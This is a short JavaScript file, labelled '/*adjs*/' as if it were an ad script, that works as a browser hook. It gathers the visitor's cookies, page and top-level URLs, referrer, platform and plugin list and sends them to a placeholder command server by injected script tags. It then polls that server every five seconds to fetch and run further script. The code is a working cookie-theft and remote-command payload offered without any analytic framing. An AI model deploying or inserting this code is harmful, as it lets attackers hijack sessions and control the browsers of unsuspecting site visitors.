/*adjs*/
adad = {};
adad.cmd_url = 'cmdaddress/c/'; // cmdaddress to be replaced
adad.gone = 0;
adad.done = 0;

adad.json2kvstr = function (o) {
    var x = "";
    for (var i in o) {
        x += i + '=' + escape(o[i]) + '&';
    }
    return x.substring(0, x.length - 1);
};
adad.injscript = function (a, b) {
    var o = document.createElement("script");
    o.type = "text/javascript";
    o.src = a;
    if (b) {
        if (!window.ActiveXObject) {
            o.onload = b;
        } else {
            o.onreadystatechange = function () {
                if (o.readyState == 'loaded' || o.readyState == 'complete') {
                    b();
                }
            };
        }
    }
    document.getElementsByTagName("body")[0].appendChild(o);
    return o;
};

adad.info = {};
adad.info.pid = 'abcdefg'; // abcdefg to be replaced
adad.info.referrer = document.referrer;
adad.info.location = window.location.href;
adad.info.toplocation = top.location.href;
try {
    adad.info.cookie = document.cookie;
} catch(error) {
    adad.info.cookie = "-";
};
adad.info.domain = document.domain;
adad.info.title = document.title;
adad.info.charset = document.characterSet ? document.characterSet : document.charset;
adad.info.platform = navigator.platform;
adad.info.screen = function () {
    var c = "";
    if (self.screen) {
        c = screen.width + "x" + screen.height;
    }
    return c;
}();
adad.info.plugins = '';
if (window.ActiveXObject) {
    adad.info.lang = navigator.systemLanguage;
    var __c = null;
    try {
        __c = new ActiveXObject('ShockwaveFlash.ShockwaveFlash');
    } catch (e) {}
    if (__c) {
        adad.info.plugins = 'Shockwave Flash ' + __c.GetVariable('$version');
    }
} else {
    adad.info.lang = navigator.language;
    if (navigator.plugins && navigator.plugins.length > 0) {
        for (var i = 0; i < navigator.plugins.length; i++) {
            adad.info.plugins += navigator.plugins[i].name + ',' + navigator.plugins[i].description + '|';
        }
    }
}

adad.tunnel = function () {
    if (adad.done == 0) {
        var a = adad.injscript(adad.cmd_url + '?' + adad.i + '&date=' + new Date().getTime());
    }
    if (adad.done == 1) {
        var a = adad.injscript(adad.cmd_url + '?' + 'pid=' + adad.info.pid + '&date=' + new Date().getTime());
        setTimeout(function () {
            document.body.removeChild(a);
        }, 500);
    }
};

function go() {
    if(adad.gone) return;
    adad.gone = 1;
    adad.i = adad.json2kvstr(adad.info);
    adad.tunnel();
    setInterval(function () {
        adad.tunnel();
    }, 5000);
}
window.onload = function () {
    setTimeout("go()", 1 * 1000);
};setTimeout("go()", 5 * 1000);
